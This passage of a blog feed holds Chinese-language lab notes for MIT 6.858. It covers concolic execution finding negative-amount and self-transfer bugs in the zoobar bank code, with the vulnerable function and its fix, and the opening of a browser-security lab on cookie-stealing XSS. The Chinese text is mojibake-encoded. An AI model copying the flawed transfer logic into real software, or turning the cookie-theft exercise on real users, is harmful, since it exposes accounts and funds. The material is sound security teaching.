‡å‡½æ•°ï¼Œè·å–åˆ°è¿”å›å€¼ã€åˆ†æ”¯æ¡ä»¶åˆ—è¡¨ã€åˆ†æ”¯è°ƒç”¨æ–¹åˆ—è¡¨</li><li>å°†å¾—åˆ°çš„æ–°çš„è¿”å›å€¼æ·»åŠ è‡³ <code>outs</code> é›†åˆ</li><li>å†…å±‚å°å¾ªç¯éå†åˆ†æ”¯æ¡ä»¶åˆ—è¡¨<ul><li>è°ƒç”¨ <code>concolic_force_branch()</code> è·å–å°†å½“å‰åˆ†æ”¯æ¡ä»¶é€†è½¬åçš„çº¦æŸæ¡ä»¶</li><li>è‹¥è¯¥çº¦æŸä¸åœ¨ <code>checked</code> ï¼ˆå·²éªŒè¯çº¦æŸé›†åˆï¼‰ä¸­ï¼Œæ·»åŠ ï¼Œå¹¶è°ƒç”¨ <code>concolic_find_input()</code> è¿›è¡Œçº¦æŸæ±‚è§£</li><li>çº¦æŸå¯è§£ï¼Œå°†ç»“æœæ·»åŠ åˆ°ä¸‹ä¸€æ¬¡ä½œä¸ºè¾“å…¥çš„å…·ä½“å€¼å­—å…¸ä¸­</li></ul></li></ul></li></ul><p>æˆ‘ä»¬ä¸éš¾å¾—çŸ¥çš„æ˜¯ï¼Œå½“ <code>test_stuff()</code> æŠ¥å‘Šæ¼æ´æ—¶ï¼Œ<strong>è¯´æ˜æˆ‘ä»¬çš„ concolic execution system ç»™å‡ºäº†ä¸€ä¸ªèƒ½å¤Ÿè§¦å‘æ¼æ´çš„ concrete input</strong></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹è¯­å¥æ¥å°†è¾“å‡ºé‡å®šå‘è‡³å½“å‰ç›®å½•ä¸‹çš„ <code>typescript</code> æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬ç”¨åˆ°çš„ä¸¤ä¸ª report() å‡½æ•°å®é™…ä¸Šå°±åªæ˜¯ <code>print()</code> è€Œå·²ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¾“å‡ºç»“æœä¸­æœç´¢å¯¹åº”çš„å­—ç¬¦ä¸²å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_balance_mismatch</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Balance mismatch detected&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_zoobar_theft</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Zoobar theft detected&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ä¸¤ä¸ªä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;-10&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1689</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css...</span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br><span class="hljs-string">WARNING: Balance mismatch detected</span><br><span class="hljs-string">Trying concrete value: &#123;&#x27;</span>form_recipient_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_val<span class="hljs-string">&#x27;: &#x27;</span>-<span class="hljs-number">10</span><span class="hljs-string">&#x27;, &#x27;</span>rsplit_split_cookie_=_r_<span class="hljs-comment">#_r&#x27;: &#x27;atok&#x27;, &#x27;rsplit_split_cookie_=_r_#_l&#x27;: &#x27;alice&#x27;, &#x27;split_cookie_=_r&#x27;: &#x27;alice#atok&#x27;, &#x27;split_cookie_=_l&#x27;: &#x27;PyZoobarLogin&#x27;, &#x27;cookie&#x27;: &#x27;PyZoobarLogin=alice#atok&#x27;, &#x27;path&#x27;: &#x27;fer&#x27;, &#x27;form_recipient_val&#x27;: &#x27;bob&#x27;, &#x27;referrer&#x27;: &#x27;&#x27;&#125;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1686</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;tex...</span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br><span class="hljs-string">WARNING: Zoobar theft detected</span><br></code></pre></td></tr></table></figure><p>å‚æ•°çš„å«ä¹‰ä¸éš¾è¾¨è®¤ï¼Œ<code>form_zoobars_val</code> ä¸ºå•æ¬¡ transfer çš„æ•°å€¼ï¼Œ<code>cookie</code> è¡¨ç¤ºå‘é€æ–¹ç”¨æˆ·ååŠ cookieï¼Œ<code>form_recipient_val</code> è¡¨ç¤ºæ¥æ”¶æ–¹ç”¨æˆ·åï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºè‡³å°‘å¯èƒ½å­˜åœ¨ä¸¤ä¸ªæ¼æ´ï¼š</p><ul><li>æœªå¯¹è´Ÿæ•°çš„ transfer è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ä¸€ä¸ªç”¨æˆ·å¯ä»¥ç›—å–å¦ä¸€ç”¨æˆ·çš„ balance</li><li>æœªå¯¹ self-transfer çš„æƒ…å†µåšåˆé€‚å¤„ç†ï¼Œå¯¼è‡´æœ€åæ€»çš„ balance ä¸ä¸€è‡´</li></ul><p>ä½†è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªçŸ¥é“  <em>æ¼æ´æ˜¯å­˜åœ¨çš„</em>  ï¼Œè€Œä¸çŸ¥é“  <em>æ¼æ´åœ¨ä½•å¤„</em>  ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬éœ€è¦å†å®¡ä¸€å®¡æ—¥å¿—åˆ«çš„åœ°æ–¹ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ä¼šæœ‰ä¸€äº›æŠ›å¼‚å¸¸çš„æ—¥å¿—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/transfer.py&quot;</span>, line <span class="hljs-number">16</span>, <span class="hljs-keyword">in</span> transfer<br>    bank.transfer(g.user.person.username,<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/bank.py&quot;</span>, line <span class="hljs-number">12</span>, <span class="hljs-keyword">in</span> transfer<br>    recipient_balance = recipientp.zoobars + zoobars<br>AttributeError: <span class="hljs-string">&#x27;NoneType&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;zoobars&#x27;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1683</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n       </span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br></code></pre></td></tr></table></figure><p>è¯´æ˜ä¸»è¦çš„å¤„ç†é€»è¾‘åº”å½“æ˜¯åœ¨ <code>zoobar/bank.py</code> ä¸­çš„ <code>transfer()</code> å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä»£ç å®¡è®¡+ä¿®å¤ç¯èŠ‚äº†ï¼Œè¯¥å‡½æ•°çš„æ ¸å¿ƒé€»è¾‘ä¸»è¦å°±æ˜¯å¼€å¤´è¿™ä¸€æ®µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    persondb = person_setup()<br>    senderp = persondb.query(Person).get(sender)<br>    recipientp = persondb.query(Person).get(recipient)<br><br>    sender_balance = senderp.zoobars - zoobars<br>    recipient_balance = recipientp.zoobars + zoobars<br><br>    <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError()<br><br>    senderp.zoobars = sender_balance<br>    recipientp.zoobars = recipient_balance<br>    persondb.commit()<br><br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼š</p><ul><li>ç¼ºå¤±äº†å¯¹ transfer æ•°é‡ä¸ºè´Ÿçš„æ£€æŸ¥</li><li>é‡å¤èµ‹å€¼å¯¼è‡´å¯¹ self-transfer çš„æƒ…å†µè®¡ç®—é”™è¯¯</li></ul><p>ä¿®æ”¹çš„åŠæ³•å…¶å®æ¯”è¾ƒç®€å•ï¼Œç”±äº username ä¸ºä¸»é”®ï¼Œæ•…è‹¥ <code>sender == recipient</code>ï¼Œç›´æ¥è·³è¿‡è½¬è´¦æ“ä½œå³å¯ï¼ŒåŒæ—¶å¯¹ transfer æ•°é‡ä¸ºè´Ÿæ•°çš„æƒ…å†µç›´æ¥è½¬ä¸º 0 å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    <span class="hljs-comment"># for zoobars &lt; 0, convert it to 0</span><br>    <span class="hljs-keyword">if</span> zoobars &lt; <span class="hljs-number">0</span>:<br>        zoobars = <span class="hljs-number">0</span><br>    <br>    <span class="hljs-comment"># if self-transfer, we don&#x27;t need to do anything</span><br>    <span class="hljs-keyword">if</span> sender != recipient:<br>        persondb = person_setup()<br>        senderp = persondb.query(Person).get(sender)<br>        recipientp = persondb.query(Person).get(recipient)<br><br>        sender_balance = senderp.zoobars - zoobars<br>        recipient_balance = recipientp.zoobars + zoobars<br><br>        <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> ValueError()<br><br>        senderp.zoobars = sender_balance<br>        recipientp.zoobars = recipient_balance<br>        persondb.commit()<br>    <br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡æ‰€æœ‰æ£€æŸ¥</p><p><img src="https://s2.loli.net/2022/12/25/GYVItmEXyuZCUfo.png" alt="image.png"></p><p>è‡³æ­¤ï¼ŒLab 3 å…¨éƒ¨å®Œæˆ</p><h1 id="0x04-Lab-4-Browser-securityï¼ˆuncompletedï¼‰"><a href="#0x04-Lab-4-Browser-securityï¼ˆuncompletedï¼‰" class="headerlink" title="0x04.Lab 4: Browser securityï¼ˆuncompletedï¼‰"></a>0x04.Lab 4: Browser securityï¼ˆuncompletedï¼‰</h1><h2 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h2><p>æœ¬ Lab ä¸»è¦å¸¦å¤§å®¶åšåŸºäºæµè§ˆå™¨çš„æ”»å‡»ï¼ˆbrowser-based attacksï¼Œå…¶å®å°±æ˜¯ web æ‰‹ç©çš„é‚£ä¸€å¥—ï¼‰ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>Part 1ï¼šè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆcross-site scripting attackï¼ŒXSSï¼‰</li><li>Part 2ï¼šä¾§ä¿¡é“ä¸é’“é±¼æ”»å‡»ï¼ˆside channel and phishing attackï¼‰</li><li>Part 3ï¼šä¸€ä¸ªç®€å•çš„è •è™«ï¼ˆa profile wormï¼‰</li></ul><h2 id="Network-setup"><a href="#Network-setup" class="headerlink" title="Network setup"></a>Network setup</h2><p>å› ä¸ºæˆ‘ä»¬éœ€è¦åœ¨ web æµè§ˆå™¨æ„é€ æ”»å‡»ï¼Œä¸ºäº†ä¿è¯è¯„åˆ†ç³»ç»Ÿæ­£å¸¸ï¼Œæˆ‘ä»¬çš„ zoobar web æœåŠ¡å™¨å¿…é¡»è¦åœ¨ <code>http://localhost:8080/</code> ä¸Šè¿›è¡Œè®¿é—®</p><p><del>å¦‚æœä½ æ˜¯ä½¿ç”¨ KVM æˆ– VirtualBoxï¼Œè‡ªå·±å›å»ç¿»å®éªŒæ‰‹å†Œ</del>ï¼›å¦‚æœä½ ä½¿ç”¨ VMWareï¼Œæˆ‘ä»¬å°†é€šè¿‡ ssh è¿›è¡Œç«¯å£è½¬å‘</p><p>é¦–å…ˆæ‰¾åˆ°ä½ çš„è™šæ‹Ÿæœºçš„ IPï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip addr show dev eth0</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/25/COioRUJdS81apIG.png" alt="image.png"></p><p>å¯¹äº Mac å’Œ Linux ç”¨æˆ·ï¼Œåœ¨å®¿ä¸»æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh -L localhost:8080:localhost:8080 student@VM-IP-ADDRESS</span><br>student@VM-IP-ADDRESS&#x27;s password: 6858<br></code></pre></td></tr></table></figure><p>å¯¹äº Windows ç”¨æˆ·ï¼Œ<del>æ²¡æ•‘äº†ç­‰æ­»å§</del>ï¼Œå¦‚æœä½ ç”¨çš„æ˜¯ PuTTYï¼Œå¯ä»¥æ ¹æ®è¿™äº›  <a href="https://web.archive.org/web/20140811071925/http://www.cs.uu.nl/technical/services/ssh/putty/puttyfw.html">instructions</a> å®Œæˆè®¾ç½®ï¼Œ<del>å¦‚æœä½ ç”¨çš„æ˜¯ OpenSSH é‚£å°±ç­‰æ­»å§</del></p><h2 id="Web-browser"><a href="#Web-browser" class="headerlink" title="Web browser"></a>Web browser</h2><p>æœ¬ Lab æ¨èä½¿ç”¨  <a href="https://www.mozilla.com/firefox/">Mozilla Firefox</a> ï¼Œ <del>è¯´æ˜¯ Firefox å¯ä»¥åœ¨è®¸å¤šç§OS ä¸Šè·‘ä½†ğŸ‘´å¯»æ€ Chrome ä¸ç…§æ ·èƒ½è€Œä¸”åº”ç”¨èŒƒå›´ä¸çŸ¥é“æ¯” Firefox å¤šå¤šå°‘äº†</del> ï¼Œè‹¥å¼€å¯äº† ad-blocking ç­‰æ’ä»¶åˆ™éœ€è¦å°†å…¶å…³é—­</p><h2 id="Setting-up-the-web-server"><a href="#Setting-up-the-web-server" class="headerlink" title="Setting up the web server"></a>Setting up the web server</h2><p>é¦–å…ˆè¿˜æ˜¯æŒ‰æƒ¯ä¾‹ä¿å­˜ Lab 3 çš„ç­”æ¡ˆï¼Œåˆ‡åˆ° Lab 4 åˆ†æ”¯ï¼Œmake ä¸€ä¸‹æ£€æŸ¥æœ‰æ²¡æœ‰é—®é¢˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~$ cd lab<br>student@vm-6858:~/lab$ git commit -am &#x27;my solution to lab3&#x27;<br>[lab3 c54dd4d] my solution to lab3<br> 1 files changed, 1 insertions(+), 0 deletions(-)<br>student@vm-6858:~/lab$ git pull<br>Already up-to-date.<br>student@vm-6858:~/lab$ git checkout -b lab4 origin/lab4<br>Branch lab4 set up to track remote branch lab4 from origin.<br>Switched to a new branch &#x27;lab4&#x27;<br>student@vm-6858:~/lab$ make<br>...<br></code></pre></td></tr></table></figure><p>ç„¶åæŒ‰æƒ¯ä¾‹ç”¨ä¸‹é¢çš„è¯­å¥åœ¨ 8080 ç«¯å£è·‘ zookdï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~/lab$ ./zookd 8080<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨  <code>http://localhost:8080/</code> å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ Zoobar é¡µé¢<del>è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„è€æ ·å­</del></p><p><img src="https://s2.loli.net/2022/12/25/dU7ZvOKPLX4mzs9.png" alt="image.png"></p><h2 id="Crafting-attacks"><a href="#Crafting-attacks" class="headerlink" title="Crafting attacks"></a>Crafting attacks</h2><p>æœ¬ Lab ä¸­æˆ‘ä»¬å°†ç”¨ä¸åŒçš„æ”»å‡»æ‰‹æ®µæ¥æ”»å‡» zoobarï¼Œè¯„æµ‹ç³»ç»Ÿå°†åœ¨æ¸…ç©ºæ³¨å†Œç”¨æˆ·æ•°æ®åº“ï¼ˆé™¤äº† <code>&quot;attacker&quot;</code> ç”¨æˆ·ï¼‰åè¿è¡Œæˆ‘ä»¬çš„æ”»å‡»è„šæœ¬ï¼Œä¸å‰é¢çš„ Lab ç±»ä¼¼çš„æ˜¯æˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡ <code>make check</code> æ¥è¿›è¡Œæ£€æŸ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥æ£€æŸ¥å¹¶ä¸å¤Ÿå½»åº•ï¼ˆå°¤å…¶æ˜¯å¯¹äºæ¡ä»¶ç«äº‰è€Œè¨€ï¼‰ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¤šè¿è¡Œå‡ æ¬¡æ¥ç¡®è®¤æ”»å‡»æˆåŠŸ</p><p>å¯¹äº Exercise 5ã€13ã€14 ä¸ challenge è€Œè¨€ï¼Œ<code>make check</code> è„šæœ¬ä¸è¶³ä»¥çœ‹å‡ºç«™ç‚¹åœ¨æ”»å‡»å‰åçš„åŒºåˆ«ï¼Œå› æ­¤è¿™éœ€è¦æˆ‘ä»¬è‡ªè¡Œå®Œæˆå¯¹æ¯”ï¼ˆMIT çš„è€å¸ˆä¹Ÿä¼šæ‰‹åŠ¨å®Œæˆè¯„æµ‹ï¼Œ <del>ä»–çœŸçš„ğŸ‘´å“­æ­»</del> ï¼‰ï¼›<code>make check</code> åœ¨è¿è¡Œæ—¶ä¼šåœ¨ <code>lab4-tests/</code> ä¸‹ç”Ÿæˆæ”»å‡»é¡µé¢åº”æœ‰çš„å¤–è§‚çš„å›¾ç‰‡ï¼ˆ<code>answer-XX.ref.png</code>ï¼‰ä¸æˆ‘ä»¬çš„æ”»å‡»é¡µé¢çš„å®é™…çš„æ ·å­ï¼ˆ<code>answer-XX.png</code>ï¼‰ï¼Œæˆ‘ä»¬åº”å½“è¦ç¡®ä¿ä¸¤è€…åº”å½“ä¸€è‡´</p><h2 id="Part-1-a-cross-site-scripting-XSS-attack"><a href="#Part-1-a-cross-site-scripting-XSS-attack" class="headerlink" title="Part 1: a cross-site scripting (XSS) attack"></a>Part 1: a cross-site scripting (XSS) attack</h2><p>zoobar çš„ç”¨æˆ·ç•Œé¢æœ‰ä¸€ä¸ªèƒ½ä»ç™»å…¥ç”¨æˆ·çš„æµè§ˆå™¨çªƒå–å…¶ cookie çš„æ¼æ´ï¼ˆè‹¥æ”»å‡»è€…èƒ½è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è¿æ¥ï¼‰ï¼Œæˆ‘ä»¬çš„å·¥ä½œä¾¿æ˜¯æ„é€ è¿™æ ·ä¸€ä¸ªé“¾æ¥</p><p>éœ€æ±‚çš„å‰ç½®çŸ¥è¯†ï¼šJavascriptï¼ŒDOM ç­‰</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 1ï¼Œåœ¨  <code>answer-1.js</code> ä¸­ç¼–å†™æ”»å‡»è„šæœ¬æ‰“å°å‡ºç”¨æˆ·çš„ cookieï¼Œæœ¬åœ°æµ‹è¯•çš„è¯å°±ä¿ç•™ä¸€ä»½ <code>zoobar/templates/users.html</code> çš„æ‹·è´å¹¶æ·»åŠ   <code>&lt;script&gt;</code>  æ ‡ç­¾æ¥å¼•å…¥æ”»å‡»è„šæœ¬ï¼š</p><blockquote><p><strong>Exercise 1: Print cookie.</strong></p><p>Cookies are HTTPâ€™s main mechanism for tracking users across requests. If an attacker can get ahold of another userâ€™s cookie, they can completely impersonate that other user. For this exercise, your goal is simply to print the cookie of the currently logged-in user when they access the â€œUsersâ€ page.</p><ol><li><p>Read about how <a href="https://developer.mozilla.org/en-US/docs/Web/API/document.cookie">cookies are accessed from Javascript</a>.</p></li><li><p>Save a copy of <code>zoobar/templates/users.html</code> (youâ€™ll need to restore this original version later). Add a <code>&lt;script&gt;</code> tag to <code>users.html</code> that prints the logged-in userâ€™s cookie using <code>alert()</code></p><p>Your script might not work immediately if you made a Javascript programming error. Fortunately, Chrome has fantastic debugging tools accessible in the Inspector: the JavaScript console, the DOM inspector, and the Network monitor. The JavaScript console lets you see which exceptions are being thrown and why. The DOM Inspector lets you peek at the structure of the page and the properties and methods of each node it contains. The Network monitor allows you to inspect the requests going between your browser and the website. By clicking on one of the requests, you can see what cookie your browser is sending, and compare it to what your script prints.</p></li><li><p>Put the contents of your script in a file named <code>answer-1.js</code>. Your file should only contain javascript (donâ€™t include <code>&lt;script&gt;</code> tags).</p></li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ„Ÿè§‰ä¸å¦‚ CTF 7 å¤©é€Ÿæˆè¯¾ç¨‹â€¦ç”»è´¨â€¦&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="http://blog.arttnba3.cn/categories/EXPERIMENTS/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ç¬¦å·æ‰§è¡Œ" scheme="http://blog.arttnba3.cn/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="ret2libc" scheme="http://blog.arttnba3.cn/tags/ret2libc/"/>
    
    <category term="æ ˆæº¢å‡º" scheme="http://blog.arttnba3.cn/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="ret2shellcode" scheme="http://blog.arttnba3.cn/tags/ret2shellcode/"/>
    
    <category term="å®éªŒç¬”è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="http://blog.arttnba3.cn/tags/MIT/"/>
    
    <category term="Concolic Execution" scheme="http://blog.arttnba3.cn/tags/Concolic-Execution/"/>
    
  </entry>
  
  <entry>
    <title>ã€ANGR.0x00ã€‘ä» angr-CTF å…¥é—¨ angr çš„åŸºæœ¬ç”¨æ³•</title>
    <link href="http://blog.arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/"/>
    <id>http://blog.arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/</id>
    <published>2022-11-23T18:48:35.000Z</published>
    <updated>2022-12-02T18:23:54.271Z</updated>
    
